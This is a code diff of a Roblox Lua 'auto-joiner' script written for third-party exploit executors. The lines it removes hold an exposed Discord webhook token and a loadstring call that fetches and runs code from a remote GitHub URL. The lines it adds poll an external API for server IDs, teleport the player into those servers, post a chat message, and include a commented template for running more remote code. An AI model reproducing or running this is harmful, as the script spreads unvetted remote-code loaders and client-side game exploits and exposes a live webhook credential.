@@ -1,3 +1,118 @@
-Token = "DHu7NBzKSQtlDzM3xrvHAsAJ8F2hlMnkuNghWvX_DH9yTjGGFkMLEAokJoeE3GdZssJ8"
-Webhook = "https://discord.com/api/webhooks/1377919416066379827/DHu7NBzKSQtlDzM3xrvHAsAJ8F2hlMnkuNghWvX_DH9yTjGGFkMLEAokJoeE3GdZssJ8"
-loadstring(game:HttpGet("https://raw.githubusercontent.com/SpaceScriptHUB/gagautojoiner/refs/heads/main/autojoiner"))()
+local Players = game:GetService("Players")
+local TeleportService = game:GetService("TeleportService")
+local HttpService = game:GetService("HttpService")
+local ReplicatedStorage = game:GetService("ReplicatedStorage")
+local TextChatService = game:GetService("TextChatService")
+
+-- CONFIGURATION
+local REDIS_API_URL = "https://api-beta-mocha-45.vercel.app/api/getInstanceId"
+local PLACE_ID = 126884695634066 -- CHANGE TO YOUR GAME ID
+local CHECK_INTERVAL = 10 -- Seconds between checks
+local MAX_WAIT_TIME = 300 -- Max seconds to wait (5 minutes)
+
+-- Global variable to track last joined instance
+local lastInstanceId = nil
+
+-- Enhanced HTTP request function
+local function makeRequest()
+    local requestFunc = syn and syn.request or http_request or request
+    if not requestFunc then
+        warn("HTTP request not supported in this executor")
+        return nil
+    end
+    
+    local success, response = pcall(function()
+        return requestFunc({
+            Url = REDIS_API_URL,
+            Method = "GET",
+            Headers = {
+                ["Content-Type"] = "application/json"
+            }
+        })
+    end)
+    
+    return success and response or nil
+end
+
+-- Function to send chat message
+local function sendChatMessage(message)
+    if TextChatService then
+        -- New TextChatService system (Roblox beta)
+        local channel = TextChatService.TextChannels.RBXGeneral
+        if channel then
+            channel:SendAsync(message)
+        end
+    else
+        -- Legacy chat system
+        local chatEvent = ReplicatedStorage:FindFirstChild("DefaultChatSystemChatEvents")
+        if chatEvent then
+            chatEvent.SayMessageRequest:FireServer(message, "All")
+        end
+    end
+end
+
+-- Function to execute after joining
+local function postJoinActions()
+    print("Successfully joined new instance!")
+    
+    -- Send chat message
+    sendChatMessage("Hello guys!")
+    
+    -- Add your custom code here that should run after joining
+    -- Example:
+    -- loadstring(game:HttpGet("https://your-script.com/script.lua"))()
+    
+    print("Post-join actions completed")
+end
+
+-- Main joining function
+local function joinNewInstance()
+    while true do
+        print("Checking for new instances...")
+        
+        local response = makeRequest()
+        if response and response.StatusCode == 200 then
+            local success, data = pcall(HttpService.JSONDecode, HttpService, response.Body)
+            if success and data and data.instanceId then
+                if not lastInstanceId or data.instanceId ~= lastInstanceId then
+                    print("Found new instance:", data.instanceId)
+                    
+                    local joinSuccess = pcall(function()
+                        TeleportService:TeleportToPlaceInstance(PLACE_ID, data.instanceId, Players.LocalPlayer)
+                    end)
+                    
+                    if joinSuccess then
+                        lastInstanceId = data.instanceId
+                        
+                        -- Wait until successfully joined
+                        local startTime = os.time()
+                        while os.time() - startTime < MAX_WAIT_TIME do
+                            if game.JobId == data.instanceId then
+                                postJoinActions()
+                                return true
+                            end
+                            wait(1)
+                        end
+                        
+                        warn("Failed to verify join within timeout")
+                    else
+                        warn("Failed to teleport to new instance")
+                    end
+                else
+                    print("No new instances available yet")
+                end
+            else
+                warn("Invalid response format from API")
+            end
+        else
+            warn("Failed to fetch instance data")
+        end
+        
+        wait(CHECK_INTERVAL)
+    end
+end
+
+-- Initial execution
+if not pcall(joinNewInstance) then
+    warn("Auto-joiner encountered a critical error")
+end
